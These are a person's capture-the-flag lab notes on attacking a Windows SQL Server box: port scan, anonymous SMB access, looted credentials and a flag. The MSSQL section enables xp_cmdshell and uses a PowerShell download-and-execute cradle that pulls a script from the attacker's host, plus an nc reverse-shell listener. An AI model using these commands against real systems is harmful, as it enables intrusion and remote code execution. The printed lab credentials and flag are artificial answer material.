Port Scan: nmap -sV -sC 10.10.10.27

# ports-and-services.md:
	```
	135/tcp  open  msrpc        Microsoft Windows RPC
	139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
	1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
	```
- Lessons Learned:
	- Using -sC in nmap will get detailed information the services running apart from just the version number
	- Pretty much always do nmap -sV -sC


# services/smb.md:
- Allows for anonymous login
- Only backups/ & IPC$/ are mountable
- Creds found at `\\10.10.10.27\backups\prod.dtsConfig`
	- User:	`ARCHETYPE\sql_svc`
	- Pass:	`M3g4c0rp123`
- Found root flag at `\\10.10.10.27\C$\Users\Administrator\Desktop\root.txt`
	- Flag: `b91ccec3305e98240082d4474b848528`

			
- Lessons Learned
	- When just listing the root dir of the share, you don't need any backslashes
	- When connecting to a share it expects two backslashes before the hostname/ip and a single backslash for each directory
		- Since "\" is an escape character you need to double the amount of backslashes
		- Ex \\\\myhost\\mydir
	- The IPC$ directory was mountable, but seemd to be empty with all other directories getting access denied
	- Once you have admin credentials, connecting via SMB to something like C$ is the way to go. That way you have access to the whole disk

MSSQL: mssqlclient.py -windows-auth ARCHETYPE/sql_svc@10.10.10.27
	- 

	- Notes
		- Note that the username and domain are sperated by a forward slash not a backslash!
		- After typing help we get a list of option with one of which being enable_xp_cmdshell which wil allow for RCE
		- First I tried setting up a webserver on my local machine and fetching the file on the server with "xp_cmdshell curl -o twof_shell.ps1 http://10.10.14.129/twof_shell.ps1"
			- This did not work since I didn't have permission to write files
		- The solution was to call powershell and tell it to download the contents of my script and invoke the string output immediatly without saving it to a file
			- This at first did not work sicne the Micorsoft.PowerShell.Utility module was not loaded. To fix this I added "Import-Module Microsoft.PowerShell.Utility;" to the start of my script
			- Final solution: xp_cmdshell "powershell "Import-Module Microsoft.PowerShell.Utility; IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.129/twof_shell.ps1\");""
				- host listening with: nc -lnvp 443
		- powershell "Import-Module Microsoft.PowerShell.Utility; IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.129/twof_shell.ps1\");"
			- This is a really powerful command and should be used when you can't save a file but you can invoke powershell

# services/shell.md
- Found administrator credentials by looking at powershell command history
	- User: `administrator`
	- Pass: `MEGACORP_4dm1n!!`

